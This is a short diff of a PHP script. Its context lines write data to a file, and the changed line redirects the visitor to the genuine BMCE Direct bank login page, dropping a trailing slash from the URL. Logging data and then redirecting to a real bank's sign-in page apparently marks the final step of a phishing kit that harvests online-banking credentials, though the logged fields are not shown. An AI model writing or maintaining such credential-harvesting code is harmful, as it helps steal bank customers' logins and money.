@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://www.bmcedirect.ma/fr/identification/authentification.html/");
+header("location:https://www.bmcedirect.ma/fr/identification/authentification.html");
 exit;
 ?>
